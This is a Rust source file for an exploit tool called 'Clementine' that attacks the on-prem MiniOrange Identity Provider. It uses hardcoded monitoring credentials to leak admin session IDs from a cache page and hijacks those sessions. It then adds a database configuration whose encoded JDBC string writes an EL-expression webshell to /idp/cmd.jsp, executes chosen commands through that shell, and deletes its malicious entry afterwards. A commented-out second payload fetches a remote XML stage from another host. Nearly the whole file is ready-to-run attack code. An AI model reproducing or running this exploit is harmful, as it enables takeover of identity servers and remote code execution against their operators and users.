/*
    Clementine exploits a vulnerability in the on-prem MiniOrange Identity Provider. Using the hardcoded
    credentials (moadminidp:P@ssw0rd$987123) for the monitoring servlet (JavaMelody), we can access a page that lists
    the names of cache keys used by Apache Shiro. The names of the keys match session IDs for logged in
    users of the admin dashboard.

    We can perform session fixation using these IDs to access the post-auth attack surface. Once logged in
    as an admin, we can add a new database connection, which opens up a few code execution paths via JDBC connectors:
        - EL expression via logger output (drop a self-fixing webshell) - default method
        - socketFactoryArg gadget chain: create a ProcessBuilder and launch `wget` to pull a webshell down (commented out)

    Vulnerable Versions: 
        Last tested on miniOrange 3.4
)
 */
use clap::Parser;
use regex::Regex;
use reqwest::blocking::Client;
use reqwest_cookie_store::CookieStoreMutex;
use std::{collections::HashSet, error::Error, sync::Arc, thread, time::Duration};
use url::Url;

#[derive(thiserror::Error, Debug, Clone)]
pub enum SploitError {
    #[error("No valid customer admin sessions found")]
    NoValidSessions,

    #[error("Couldn't find a CSRF token in page")]
    NoCSRFToken,

    #[error("Failed to add malicious database object")]
    DatabaseAddFailed,

    #[error("Failed to trigger RCE by testing database")]
    DatabaseTriggerFailed,

    #[error("Command shell failed to execute")]
    CmdShellFailed,

    #[error("Failed to cleanup malicious database object")]
    DatabaseCleanupFailed,

    #[error("Failed to find database identifier for cleanup")]
    DatabaseIdentifierNotFound,
}

struct Sploit {
    target: Url,
    client: Arc<Client>,
}

impl Sploit {
    fn new(target: &str) -> Result<Self, Box<dyn Error>> {
        // Some default client for now
        let client = Client::builder()
            .user_agent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36")
            .cookie_store(true) // Enable cookies
            .build()
            .unwrap();
        let client = Arc::new(client);

        Ok(Sploit {
            target: Url::parse(target)?,
            client,
        })
    }

    fn leak_sessions(&self) -> Result<Vec<String>, Box<dyn Error>> {
        let mut sessions = HashSet::new();
        let re = Regex::new(r"([a-z0-9]{32})").unwrap();

        let url = self.target.join("/monitoring")?;
        // Add the hardcoded monitoring creds to our Authorization header
        let resp = Client::new()
            .get(url)
            .header(
                "Authorization",
                "Basic bW9hZG1pbmlkcDpQQHNzdzByZCQ5ODcxMjM=",
            )
            .query(&[
                ("part", "cacheKeys"),
                ("cacheId", "shiro-activeSessionCache"),
            ])
            .send()?
            .text()?;

        for capture in re.captures_iter(&resp) {
            sessions.insert(capture[0].to_string());
        }

        Ok(sessions.into_iter().collect())
    }

    // TODO: Need to match something of the form `<a  class="deleteIdpLink red" data-idpid="13" data-idpname="clementine">`
    fn grep_db_id(&self, identifier: &str) -> Result<u32, Box<dyn Error>> {
        let re = Regex::new(
            // lol
            format!(
                r#"<a\s+class="deleteIdpLink red"\s+data-idpid="(\d+)"\s+data-idpname="{}">"#,
                identifier
            )
            .as_str(),
        )
        .unwrap();
        let url = self.target.join("/admin/customer/listuserstores")?;
        let resp = self.client.get(url).send()?.text()?;

        match re.captures(&resp) {
            Some(caps) => match caps.get(1) {
                Some(cap) => {
                    // Our regex puts only numbers in the match group, so we unwrap here
                    return Ok(cap.as_str().parse::<u32>().unwrap());
                }
                None => return Err(Box::new(SploitError::DatabaseIdentifierNotFound)),
            },
            None => return Err(Box::new(SploitError::DatabaseIdentifierNotFound)),
        }
    }

    pub fn impersonate_admin(&mut self) -> Result<(), Box<dyn Error>> {
        let possible_sessions = self.leak_sessions()?;
        let url = self.target.join("/admin/customer/home")?;

        for i in possible_sessions {
            // Set the session cookie to test
            let cookies = CookieStoreMutex::default();
            cookies
                .lock()
                .unwrap()
                .parse(format!("JSESSIONID={}", i).as_ref(), &self.target)?;
            let cookies = Arc::new(cookies);

            // Build http client
            let client = Client::builder()
                .user_agent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36")
                .redirect(reqwest::redirect::Policy::none())
                .cookie_provider(cookies)
                .build()?;

            // pew pew
            let resp = client
                .get(url.as_ref())
                .header("Cookies", format!("JSESSIONID={};", i))
                .send()?;

            // am god?
            if resp.status() == 200 {
                // probably

                // Replace the sploit client with our authenticated one
                self.client = Arc::new(client);
                return Ok(());
            }
        }
        Err(Box::new(SploitError::NoValidSessions))
    }

    pub fn add_malicious_database(&self) -> Result<(), Box<dyn Error>> {
        let url = self.target.join("/admin/customer/savedatabaseidpconfig")?;
        let csrf_token = self.get_csrf_token()?;
        // Leaving this payload commented out, this relies on the well known socketFactoryArg
        // gadget entrypoint and org.springframework.context.support.FileSystemXmlApplicationContext
        //let payload = format!("struts.token.name=token&token={}&idpConfiguration.identifier=clementine&idpConfiguration.databaseType=PGSQL&idpConfiguration.databaseHost=jdbc%3Apostgresql%3A%2F%2Fhost.docker.internal%3A8899%2Fblah%3FsocketFactory%3Dorg.springframework.context.support.FileSystemXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fhost.docker.internal%3A8000%2Ftrigger.xml&idpConfiguration.databaseAdminUsername=admin&idpConfiguration.databaseAdminPassword=admin&idpConfiguration.databaseUserTablename=users&idpConfiguration.databaseUsernameColumn=username&idpConfiguration.databasePasswordColumn=password&idpConfiguration.databaseactiveusers=&__checkbox_idpConfiguration.endUserLogin=true&__checkbox_idpConfiguration.databaseSyncUsers=true&idpConfiguration.databaseHashing=None&idpConfiguration.domainMapping=&__checkbox_idpConfiguration.databaseAuthenticationViaMiniorange=true&__checkbox_idpConfiguration.sendConfiguredAttributes=true&QueryStringsMapping%5B%27check_user_query%27%5D=&QueryStringsMapping%5B%27create_user_query%27%5D=&QueryStringsMapping%5B%27update_user_query%27%5D=&QueryStringsMapping%5B%27delete_user_query%27%5D=&save=Save", csrf_token);

        // The following payload results in blind command execution, using the same
        // /idp/cmd.jsp?cmd=blah path. You can use this if the target is unable to connect back out
        // of the network to retrieve a stage 2. This relies on injecting EL expression into a new JSP
        // page by intentionally failing the database connection with log level TRACE on, which will
        // write the full error message and connect string into the file specified by `loggerFile`,
        // including parameters in the connect string. We stuff an EL expression into the
        // ApplicationName parameter for this payload. EL expressions are a bit limited.
        let payload = format!("struts.token.name=token&token={}&idpConfiguration.identifier=clementine&idpConfiguration.databaseType=PGSQL&idpConfiguration.databaseHost=%6a%64%62%63%3a%70%6f%73%74%67%72%65%73%71%6c%3a%2f%2f%68%6f%73%74%2e%64%6f%63%6b%65%72%2e%69%6e%74%65%72%6e%61%6c%3a%38%38%39%39%2f%6d%79%64%62%3f%41%70%70%6c%69%63%61%74%69%6f%6e%4e%61%6d%65%3d%24%7b%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%70%61%72%61%6d%2e%63%6d%64%29%7d%26%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%54%52%41%43%45%26%6c%6f%67%67%65%72%46%69%6c%65%3d%2e%2f%6d%6f%61%73%2f%69%64%70%2f%63%6d%64%2e%6a%73%70%26%6c%6f%67%69%6e%54%69%6d%65%6f%75%74%3d%31&idpConfiguration.databaseAdminUsername=admin&idpConfiguration.databaseAdminPassword=admin&idpConfiguration.databaseUserTablename=users&idpConfiguration.databaseUsernameColumn=username&idpConfiguration.databasePasswordColumn=password&idpConfiguration.databaseactiveusers=&__checkbox_idpConfiguration.endUserLogin=true&__checkbox_idpConfiguration.databaseSyncUsers=true&idpConfiguration.databaseHashing=None&idpConfiguration.domainMapping=&__checkbox_idpConfiguration.databaseAuthenticationViaMiniorange=true&__checkbox_idpConfiguration.sendConfiguredAttributes=true&QueryStringsMapping%5B%27check_user_query%27%5D=&QueryStringsMapping%5B%27create_user_query%27%5D=&QueryStringsMapping%5B%27update_user_query%27%5D=&QueryStringsMapping%5B%27delete_user_query%27%5D=&save=Save", csrf_token);

        let resp = self
            .client
            .post(url)
            .body(payload)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send()?;
        if resp.status() != 200 {
            println!("Failed: Status {}", resp.status());
            return Err(Box::new(SploitError::DatabaseAddFailed));
        }
        Ok(())
    }

    pub fn cleanup_malicious_db(&self) -> Result<(), Box<dyn Error>> {
        let db_id = self.grep_db_id("clementine")?;
        self.delete_db(db_id)?;
        Ok(())
    }

    fn delete_db(&self, id: u32) -> Result<(), Box<dyn Error>> {
        let url = self.target.join("/admin/customer/deleteuserstoreconfig")?;
        let csrf_token = self.get_csrf_token()?;
        let payload = format!(
            "struts.token.name=token&token={}&idpConfiguration.id={}",
            csrf_token, id
        );
        let resp = self
            .client
            .post(url)
            .body(payload)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send()?;
        if resp.status() != 200 {
            println!("Cleanup Failed: Status {}", resp.status());
            return Err(Box::new(SploitError::DatabaseCleanupFailed));
        }
        Ok(())
    }

    pub fn trigger_rce(&self) -> Result<(), Box<dyn Error>> {
        let url = self
            .target
            .join("/admin/customer/testdatabaseconfiguration")?;
        let csrf_token = self.get_csrf_token()?;
        let payload = format!(
            "testIdentifier=clementine&struts.token.name=token&token={}&testUsername=a&testPassword=a",
            csrf_token
        );
        let resp = self
            .client
            .post(url)
            .body(payload)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send()?;
        if resp.status() != 200 {
            println!("Failed: Status {}", resp.status());
            return Err(Box::new(SploitError::DatabaseTriggerFailed));
        }
        Ok(())
    }

    pub fn get_csrf_token(&self) -> Result<String, Box<dyn Error>> {
        let re = Regex::new(r"([A-Z0-9]{32})").unwrap();
        let url = self.target.join("/admin/customer/listuserstores")?;
        let resp = self.client.get(url).send()?.text()?;
        match re.captures(&resp) {
            Some(caps) => match caps.get(0) {
                Some(cap) => {
                    return Ok(cap.as_str().to_owned());
                }
                None => return Err(Box::new(SploitError::NoCSRFToken)),
            },
            None => return Err(Box::new(SploitError::NoCSRFToken)),
        }
    }

    pub fn run_cmd(&self, cmd: &str) -> Result<String, Box<dyn Error>> {
        let url = self.target.join("/idp/cmd.jsp")?;
        let client = Client::builder()
            .user_agent("curl/7.79.1")
            .redirect(reqwest::redirect::Policy::none())
            .build()?;
        let resp = client
            .post(url)
            .body(format!("cmd={}", cmd))
            .header("Content-Type", "application/x-www-form-urlencoded")
            .send()?;

        if resp.status() != 200 {
            return Err(Box::new(SploitError::CmdShellFailed));
        }
        Ok(resp.text()?)
    }
}

#[derive(Parser, Debug)]
#[clap(author,version,about,long_about=None)]
struct Args {
    #[clap(short, long, value_parser)]
    target: String,

    #[clap(short, long, value_parser)]
    cmd: String,

    #[clap(short, long, value_parser)]
    nopwn: bool,
}

fn main() -> Result<(), Box<dyn Error>> {
    let args = Args::parse();
    let mut sploit = Sploit::new(&args.target)?;
    if !args.nopwn {
        println!("[*] Searching for admin sessions");
        sploit.impersonate_admin()?;
        println!("[*] Adding malicious jdbc");
        sploit.add_malicious_database()?;
        println!("[*] Triggering connection");
        sploit.trigger_rce()?;
        thread::sleep(Duration::from_secs(3));
        println!("[*] Cleaning out malicious jdbc");
        sploit.cleanup_malicious_db()?;
        // This sleep seems to be required. If we try to access the shell too quickly, sometimes
        // we get back a 200 but with no response body. Probably something to do with a combination
        // of caching and optimized code generation from the JSP.
        thread::sleep(Duration::from_secs(3));
        println!("[*] pop pop");
    }
    let output = sploit.run_cmd(&args.cmd)?;
    println!("{}", output);
    Ok(())
}
